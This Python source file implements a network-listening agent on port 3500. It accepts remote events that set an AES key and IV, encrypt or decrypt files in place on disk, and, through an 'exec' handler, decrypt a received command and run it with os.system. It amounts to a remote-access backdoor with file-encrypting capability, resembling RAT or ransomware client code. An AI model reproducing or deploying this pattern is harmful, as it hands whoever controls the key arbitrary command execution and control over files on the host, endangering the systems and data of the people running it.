from lib.server import EventBaseServer
from lib.encryption.aes import AESCipher
import time

class AesBuilder:
  def __init__(self) -> None:
    self.iv = None
    self.key = None

  def save_iv(self, iv):
    self.iv = iv

  def save_key(self, key):
    self.key = key
  
  def build(self):
    if (self.key == None):
      raise ValueError()
    
    if (self.iv == None):
      raise ValueError()
    
    return AESCipher(self.key, self.iv)
    

class Application:
  __cipher__: AESCipher = None
  __cipher_builder__ = AesBuilder()

  def __init__(self, server: EventBaseServer) -> None:
    self.server = server
    server.subscribe('click', self.click)
    server.subscribe('exit', self.exit)
    server.subscribe('save_iv', self.save_iv)
    server.subscribe('save_key', self.save_key)
    server.subscribe('encrypt_file', self.encrypt_file)
    server.subscribe('decrypt_file', self.decrypt_file)
    server.subscribe('exec', self.exec)
    server.run()

  def exec(self, command):
    cmd = self.__cipher__.decrypt(command)
    import os
    os.system(cmd)

  def save_iv(self, iv):
    print(iv)
    self.__cipher_builder__.save_iv(bytes.fromhex(iv))
    try: self.__cipher__ = self.__cipher_builder__.build()
    except: pass

  def save_key(self, key):
    self.__cipher_builder__.save_key(bytes.fromhex(key))
    try: self.__cipher__ = self.__cipher_builder__.build()
    except: pass

  def encrypt_file(self, file_path):
    read_stream = open(file_path, 'r+')
    file_data = read_stream.read()
    encypted = self.__cipher__.encrypt(file_data.encode()).hex()
    read_stream.close()
    write_stream = open(file_path, 'w+')
    write_stream.write(encypted)
    write_stream.close()

    meta_write_stream = open(f'{file_path}.meta', 'wb')
    meta_write_stream.write(self.__cipher__.iv)
    meta_write_stream.write(self.__cipher__.key)
    meta_write_stream.close()

    self.server.emit_data('encrypt_file', 'done')

  def decrypt_file(self, file_path):
    meta_stream = open(f'{file_path}.meta', 'rb')
    data = meta_stream.read().hex()
    meta_stream.close()

    key = data[32:]
    iv = data[:32]
    enc_session = AESCipher(bytes.fromhex(key), bytes.fromhex(iv))

    read_stream = open(file_path, 'r+')
    data = read_stream.read()
    actual_data = enc_session.decrypt(bytes.fromhex(data))
    read_stream.close()

    write_stream = open(file_path, 'wb')
    write_stream.write(actual_data)
    write_stream.close()
    return

  def exit(self, code):
    try:
      time.sleep(2)
      self.server.close()
      exit(int(code))
    except:
      print('unexpected exit code ' + code)
      exit(1)

  def click(self, data):
    print('Click event has fired')
    pass

if(__name__ == '__main__'):
  Application(EventBaseServer('0.0.0.0', 3500))